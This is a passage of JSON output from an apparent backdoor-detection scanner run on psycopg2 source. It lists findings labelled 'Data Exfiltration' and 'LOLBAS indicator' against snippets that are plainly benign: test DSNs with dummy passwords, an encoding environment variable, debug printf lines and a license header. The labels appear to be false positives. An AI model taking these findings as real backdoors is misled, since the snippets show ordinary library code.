            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 430,
                  "startColumn": 53,
                  "endLine": 430,
                  "endColumn": 61,
                  "snippet": {
                    "text": "            \"simple DSN parsed\")\n\n        self.assertRaises(psycopg2.ProgrammingError, ext.parse_dsn,\n                          \"dbname=test 2 user=tester password=secret\")\n\n        self.assertEqual(\n            ext.parse_dsn(\"dbname='test 2' user=tester password=secret\"),\n",
                    "rendered": {
                      "text": "            \"simple DSN parsed\")\n\n        self.assertRaises(psycopg2.ProgrammingError, ext.parse_dsn,\n                          \"dbname=test 2 user=tester password=secret\")\n\n        self.assertEqual(\n            ext.parse_dsn(\"dbname='test 2' user=tester password=secret\"),\n",
                      "markdown": "`            \"simple DSN parsed\")\n\n        self.assertRaises(psycopg2.ProgrammingError, ext.parse_dsn,\n                          \"dbname=test 2 user=tester password=secret\")\n\n        self.assertEqual(\n            ext.parse_dsn(\"dbname='test 2' user=tester password=secret\"),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 426,
                  "startColumn": 32,
                  "endLine": 426,
                  "endColumn": 40,
                  "snippet": {
                    "text": "    def test_parse_dsn(self):\n        self.assertEqual(\n            ext.parse_dsn('dbname=test user=tester password=secret'),\n            dict(user='tester', password='secret', dbname='test'),\n            \"simple DSN parsed\")\n\n        self.assertRaises(psycopg2.ProgrammingError, ext.parse_dsn,\n",
                    "rendered": {
                      "text": "    def test_parse_dsn(self):\n        self.assertEqual(\n            ext.parse_dsn('dbname=test user=tester password=secret'),\n            dict(user='tester', password='secret', dbname='test'),\n            \"simple DSN parsed\")\n\n        self.assertRaises(psycopg2.ProgrammingError, ext.parse_dsn,\n",
                      "markdown": "`    def test_parse_dsn(self):\n        self.assertEqual(\n            ext.parse_dsn('dbname=test user=tester password=secret'),\n            dict(user='tester', password='secret', dbname='test'),\n            \"simple DSN parsed\")\n\n        self.assertRaises(psycopg2.ProgrammingError, ext.parse_dsn,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 425,
                  "startColumn": 51,
                  "endLine": 425,
                  "endColumn": 59,
                  "snippet": {
                    "text": "class ParseDsnTestCase(ConnectingTestCase):\n    def test_parse_dsn(self):\n        self.assertEqual(\n            ext.parse_dsn('dbname=test user=tester password=secret'),\n            dict(user='tester', password='secret', dbname='test'),\n            \"simple DSN parsed\")\n\n",
                    "rendered": {
                      "text": "class ParseDsnTestCase(ConnectingTestCase):\n    def test_parse_dsn(self):\n        self.assertEqual(\n            ext.parse_dsn('dbname=test user=tester password=secret'),\n            dict(user='tester', password='secret', dbname='test'),\n            \"simple DSN parsed\")\n\n",
                      "markdown": "`class ParseDsnTestCase(ConnectingTestCase):\n    def test_parse_dsn(self):\n        self.assertEqual(\n            ext.parse_dsn('dbname=test user=tester password=secret'),\n            dict(user='tester', password='secret', dbname='test'),\n            \"simple DSN parsed\")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 352,
                  "startColumn": 45,
                  "endLine": 352,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\n        c = SubConnection(\"dbname=thereisnosuchdatabasemate password=foobar\")\n        self.assert_(c.closed, \"connection failed so it must be closed\")\n        self.assert_('foobar' not in c.dsn, \"password was not obscured\")\n\n    def test_get_native_connection(self):\n        conn = self.connect()\n",
                    "rendered": {
                      "text": "\n        c = SubConnection(\"dbname=thereisnosuchdatabasemate password=foobar\")\n        self.assert_(c.closed, \"connection failed so it must be closed\")\n        self.assert_('foobar' not in c.dsn, \"password was not obscured\")\n\n    def test_get_native_connection(self):\n        conn = self.connect()\n",
                      "markdown": "`\n        c = SubConnection(\"dbname=thereisnosuchdatabasemate password=foobar\")\n        self.assert_(c.closed, \"connection failed so it must be closed\")\n        self.assert_('foobar' not in c.dsn, \"password was not obscured\")\n\n    def test_get_native_connection(self):\n        conn = self.connect()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 350,
                  "startColumn": 60,
                  "endLine": 350,
                  "endColumn": 68,
                  "snippet": {
                    "text": "                except Exception:\n                    pass\n\n        c = SubConnection(\"dbname=thereisnosuchdatabasemate password=foobar\")\n        self.assert_(c.closed, \"connection failed so it must be closed\")\n        self.assert_('foobar' not in c.dsn, \"password was not obscured\")\n\n",
                    "rendered": {
                      "text": "                except Exception:\n                    pass\n\n        c = SubConnection(\"dbname=thereisnosuchdatabasemate password=foobar\")\n        self.assert_(c.closed, \"connection failed so it must be closed\")\n        self.assert_('foobar' not in c.dsn, \"password was not obscured\")\n\n",
                      "markdown": "`                except Exception:\n                    pass\n\n        c = SubConnection(\"dbname=thereisnosuchdatabasemate password=foobar\")\n        self.assert_(c.closed, \"connection failed so it must be closed\")\n        self.assert_('foobar' not in c.dsn, \"password was not obscured\")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 261,
                  "startColumn": 23,
                  "endLine": 261,
                  "endColumn": 43,
                  "snippet": {
                    "text": "            if oldenc is not None:\n                os.environ['PGCLIENTENCODING'] = oldenc\n            else:\n                del os.environ['PGCLIENTENCODING']\n\n    def test_connect_no_string(self):\n        class MyString(str):\n",
                    "rendered": {
                      "text": "            if oldenc is not None:\n                os.environ['PGCLIENTENCODING'] = oldenc\n            else:\n                del os.environ['PGCLIENTENCODING']\n\n    def test_connect_no_string(self):\n        class MyString(str):\n",
                      "markdown": "`            if oldenc is not None:\n                os.environ['PGCLIENTENCODING'] = oldenc\n            else:\n                del os.environ['PGCLIENTENCODING']\n\n    def test_connect_no_string(self):\n        class MyString(str):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 259,
                  "startColumn": 19,
                  "endLine": 259,
                  "endColumn": 55,
                  "snippet": {
                    "text": "            self.conn = self.connect()\n        finally:\n            if oldenc is not None:\n                os.environ['PGCLIENTENCODING'] = oldenc\n            else:\n                del os.environ['PGCLIENTENCODING']\n\n",
                    "rendered": {
                      "text": "            self.conn = self.connect()\n        finally:\n            if oldenc is not None:\n                os.environ['PGCLIENTENCODING'] = oldenc\n            else:\n                del os.environ['PGCLIENTENCODING']\n\n",
                      "markdown": "`            self.conn = self.connect()\n        finally:\n            if oldenc is not None:\n                os.environ['PGCLIENTENCODING'] = oldenc\n            else:\n                del os.environ['PGCLIENTENCODING']\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 254,
                  "startColumn": 11,
                  "endLine": 254,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        # We must perform encoding normalization at connection time\n        self.conn.close()\n        oldenc = os.environ.get('PGCLIENTENCODING')\n        os.environ['PGCLIENTENCODING'] = 'utf-8'    # malformed spelling\n        try:\n            self.conn = self.connect()\n        finally:\n",
                    "rendered": {
                      "text": "        # We must perform encoding normalization at connection time\n        self.conn.close()\n        oldenc = os.environ.get('PGCLIENTENCODING')\n        os.environ['PGCLIENTENCODING'] = 'utf-8'    # malformed spelling\n        try:\n            self.conn = self.connect()\n        finally:\n",
                      "markdown": "`        # We must perform encoding normalization at connection time\n        self.conn.close()\n        oldenc = os.environ.get('PGCLIENTENCODING')\n        os.environ['PGCLIENTENCODING'] = 'utf-8'    # malformed spelling\n        try:\n            self.conn = self.connect()\n        finally:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 253,
                  "startColumn": 20,
                  "endLine": 253,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    def test_connect_nonnormal_envvar(self):\n        # We must perform encoding normalization at connection time\n        self.conn.close()\n        oldenc = os.environ.get('PGCLIENTENCODING')\n        os.environ['PGCLIENTENCODING'] = 'utf-8'    # malformed spelling\n        try:\n            self.conn = self.connect()\n",
                    "rendered": {
                      "text": "    def test_connect_nonnormal_envvar(self):\n        # We must perform encoding normalization at connection time\n        self.conn.close()\n        oldenc = os.environ.get('PGCLIENTENCODING')\n        os.environ['PGCLIENTENCODING'] = 'utf-8'    # malformed spelling\n        try:\n            self.conn = self.connect()\n",
                      "markdown": "`    def test_connect_nonnormal_envvar(self):\n        # We must perform encoding normalization at connection time\n        self.conn.close()\n        oldenc = os.environ.get('PGCLIENTENCODING')\n        os.environ['PGCLIENTENCODING'] = 'utf-8'    # malformed spelling\n        try:\n            self.conn = self.connect()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_errors.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_errors.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_type.c"
                },
                "region": {
                  "startLine": 1449,
                  "startColumn": 27,
                  "endLine": 1449,
                  "endColumn": 31,
                  "snippet": {
                    "text": "connection_repr(connectionObject *self)\n{\n    return PyString_FromFormat(\n        \"<connection object at %p; dsn: '%s', closed: %ld>\",\n        self, (self->dsn ? self->dsn : \"<unintialized>\"), self->closed);\n}\n\n",
                    "rendered": {
                      "text": "connection_repr(connectionObject *self)\n{\n    return PyString_FromFormat(\n        \"<connection object at %p; dsn: '%s', closed: %ld>\",\n        self, (self->dsn ? self->dsn : \"<unintialized>\"), self->closed);\n}\n\n",
                      "markdown": "`connection_repr(connectionObject *self)\n{\n    return PyString_FromFormat(\n        \"<connection object at %p; dsn: '%s', closed: %ld>\",\n        self, (self->dsn ? self->dsn : \"<unintialized>\"), self->closed);\n}\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_type.c"
                },
                "region": {
                  "startLine": 1416,
                  "startColumn": 58,
                  "endLine": 1416,
                  "endColumn": 62,
                  "snippet": {
                    "text": "\n    pthread_mutex_destroy(&(self->lock));\n\n    Dprintf(\"connection_dealloc: deleted connection object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                    "rendered": {
                      "text": "\n    pthread_mutex_destroy(&(self->lock));\n\n    Dprintf(\"connection_dealloc: deleted connection object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                      "markdown": "`\n    pthread_mutex_destroy(&(self->lock));\n\n    Dprintf(\"connection_dealloc: deleted connection object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_type.c"
                },
                "region": {
                  "startLine": 1356,
                  "startColumn": 53,
                  "endLine": 1356,
                  "endColumn": 57,
                  "snippet": {
                    "text": "\n    rv = 0;\n\n    Dprintf(\"connection_setup: good connection object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self));\n\n",
                    "rendered": {
                      "text": "\n    rv = 0;\n\n    Dprintf(\"connection_setup: good connection object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self));\n\n",
                      "markdown": "`\n    rv = 0;\n\n    Dprintf(\"connection_setup: good connection object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self));\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_type.c"
                },
                "region": {
                  "startLine": 1322,
                  "startColumn": 53,
                  "endLine": 1322,
                  "endColumn": 57,
                  "snippet": {
                    "text": "{\n    int rv = -1;\n\n    Dprintf(\"connection_setup: init connection object at %p, \"\n\t    \"async %ld, refcnt = \" FORMAT_CODE_PY_SSIZE_T,\n            self, async, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "{\n    int rv = -1;\n\n    Dprintf(\"connection_setup: init connection object at %p, \"\n\t    \"async %ld, refcnt = \" FORMAT_CODE_PY_SSIZE_T,\n            self, async, Py_REFCNT(self)\n      );\n",
                      "markdown": "`{\n    int rv = -1;\n\n    Dprintf(\"connection_setup: init connection object at %p, \"\n\t    \"async %ld, refcnt = \" FORMAT_CODE_PY_SSIZE_T,\n            self, async, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_type.c"
                },
                "region": {
                  "startLine": 1006,
                  "startColumn": 44,
                  "endLine": 1006,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        return NULL;\n    }\n\n    Dprintf(\"psyco_conn_lobject: new lobject at %p: refcnt = \"\n            FORMAT_CODE_PY_SSIZE_T,\n            obj, Py_REFCNT(obj));\n    return obj;\n",
                    "rendered": {
                      "text": "        return NULL;\n    }\n\n    Dprintf(\"psyco_conn_lobject: new lobject at %p: refcnt = \"\n            FORMAT_CODE_PY_SSIZE_T,\n            obj, Py_REFCNT(obj));\n    return obj;\n",
                      "markdown": "`        return NULL;\n    }\n\n    Dprintf(\"psyco_conn_lobject: new lobject at %p: refcnt = \"\n            FORMAT_CODE_PY_SSIZE_T,\n            obj, Py_REFCNT(obj));\n    return obj;\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_type.c"
                },
                "region": {
                  "startLine": 985,
                  "startColumn": 59,
                  "endLine": 985,
                  "endColumn": 63,
                  "snippet": {
                    "text": "    EXC_IF_GREEN(lobject);\n    EXC_IF_TPC_PREPARED(self, lobject);\n\n    Dprintf(\"psyco_conn_lobject: new lobject for connection at %p\", self);\n    Dprintf(\"psyco_conn_lobject:     parameters: oid = %u, mode = %s\",\n            oid, smode);\n    Dprintf(\"psyco_conn_lobject:     parameters: new_oid = %u, new_file = %s\",\n",
                    "rendered": {
                      "text": "    EXC_IF_GREEN(lobject);\n    EXC_IF_TPC_PREPARED(self, lobject);\n\n    Dprintf(\"psyco_conn_lobject: new lobject for connection at %p\", self);\n    Dprintf(\"psyco_conn_lobject:     parameters: oid = %u, mode = %s\",\n            oid, smode);\n    Dprintf(\"psyco_conn_lobject:     parameters: new_oid = %u, new_file = %s\",\n",
                      "markdown": "`    EXC_IF_GREEN(lobject);\n    EXC_IF_TPC_PREPARED(self, lobject);\n\n    Dprintf(\"psyco_conn_lobject: new lobject for connection at %p\", self);\n    Dprintf(\"psyco_conn_lobject:     parameters: oid = %u, mode = %s\",\n            oid, smode);\n    Dprintf(\"psyco_conn_lobject:     parameters: new_oid = %u, new_file = %s\",\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_type.c"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 41,
                  "endLine": 147,
                  "endColumn": 45,
                  "snippet": {
                    "text": "{\n    Dprintf(\"psyco_conn_close: closing connection at %p\", self);\n    conn_close(self);\n    Dprintf(\"psyco_conn_close: connection at %p closed\", self);\n\n    Py_RETURN_NONE;\n}\n",
                    "rendered": {
                      "text": "{\n    Dprintf(\"psyco_conn_close: closing connection at %p\", self);\n    conn_close(self);\n    Dprintf(\"psyco_conn_close: connection at %p closed\", self);\n\n    Py_RETURN_NONE;\n}\n",
                      "markdown": "`{\n    Dprintf(\"psyco_conn_close: closing connection at %p\", self);\n    conn_close(self);\n    Dprintf(\"psyco_conn_close: connection at %p closed\", self);\n\n    Py_RETURN_NONE;\n}\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_type.c"
                },
                "region": {
                  "startLine": 145,
                  "startColumn": 49,
                  "endLine": 145,
                  "endColumn": 53,
                  "snippet": {
                    "text": "static PyObject *\npsyco_conn_close(connectionObject *self, PyObject *dummy)\n{\n    Dprintf(\"psyco_conn_close: closing connection at %p\", self);\n    conn_close(self);\n    Dprintf(\"psyco_conn_close: connection at %p closed\", self);\n\n",
                    "rendered": {
                      "text": "static PyObject *\npsyco_conn_close(connectionObject *self, PyObject *dummy)\n{\n    Dprintf(\"psyco_conn_close: closing connection at %p\", self);\n    conn_close(self);\n    Dprintf(\"psyco_conn_close: connection at %p closed\", self);\n\n",
                      "markdown": "`static PyObject *\npsyco_conn_close(connectionObject *self, PyObject *dummy)\n{\n    Dprintf(\"psyco_conn_close: closing connection at %p\", self);\n    conn_close(self);\n    Dprintf(\"psyco_conn_close: connection at %p closed\", self);\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_type.c"
                },
                "region": {
                  "startLine": 124,
                  "startColumn": 42,
                  "endLine": 124,
                  "endColumn": 46,
                  "snippet": {
                    "text": "        goto exit;\n    }\n\n    Dprintf(\"psyco_conn_cursor: new cursor at %p: refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n    );\n",
                    "rendered": {
                      "text": "        goto exit;\n    }\n\n    Dprintf(\"psyco_conn_cursor: new cursor at %p: refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n    );\n",
                      "markdown": "`        goto exit;\n    }\n\n    Dprintf(\"psyco_conn_cursor: new cursor at %p: refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n    );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_type.c"
                },
                "region": {
                  "startLine": 104,
                  "startColumn": 60,
                  "endLine": 104,
                  "endColumn": 64,
                  "snippet": {
                    "text": "        goto exit;\n    }\n\n    Dprintf(\"psyco_conn_cursor: new %s cursor for connection at %p\",\n        (name == Py_None ? \"unnamed\" : \"named\"), self);\n\n    if (!(obj = PyObject_CallFunctionObjArgs(factory, self, name, NULL))) {\n",
                    "rendered": {
                      "text": "        goto exit;\n    }\n\n    Dprintf(\"psyco_conn_cursor: new %s cursor for connection at %p\",\n        (name == Py_None ? \"unnamed\" : \"named\"), self);\n\n    if (!(obj = PyObject_CallFunctionObjArgs(factory, self, name, NULL))) {\n",
                      "markdown": "`        goto exit;\n    }\n\n    Dprintf(\"psyco_conn_cursor: new %s cursor for connection at %p\",\n        (name == Py_None ? \"unnamed\" : \"named\"), self);\n\n    if (!(obj = PyObject_CallFunctionObjArgs(factory, self, name, NULL))) {\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_type.c"
                },
                "region": {
                  "startLine": 1327,
                  "startColumn": 35,
                  "endLine": 1327,
                  "endColumn": 43,
                  "snippet": {
                    "text": "            self, async, Py_REFCNT(self)\n      );\n\n    if (!(self->dsn = conn_obscure_password(dsn))) { goto exit; }\n    if (!(self->notice_list = PyList_New(0))) { goto exit; }\n    if (!(self->notifies = PyList_New(0))) { goto exit; }\n    self->async = async;\n",
                    "rendered": {
                      "text": "            self, async, Py_REFCNT(self)\n      );\n\n    if (!(self->dsn = conn_obscure_password(dsn))) { goto exit; }\n    if (!(self->notice_list = PyList_New(0))) { goto exit; }\n    if (!(self->notifies = PyList_New(0))) { goto exit; }\n    self->async = async;\n",
                      "markdown": "`            self, async, Py_REFCNT(self)\n      );\n\n    if (!(self->dsn = conn_obscure_password(dsn))) { goto exit; }\n    if (!(self->notice_list = PyList_New(0))) { goto exit; }\n    if (!(self->notifies = PyList_New(0))) { goto exit; }\n    self->async = async;\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_type.c"
                },
                "region": {
                  "startLine": 938,
                  "startColumn": 63,
                  "endLine": 938,
                  "endColumn": 71,
                  "snippet": {
                    "text": "        goto exit;\n    }\n\n    res = psyco_dict_from_conninfo_options(options, /* include_password = */ 0);\n\nexit:\n    PQconninfoFree(options);\n",
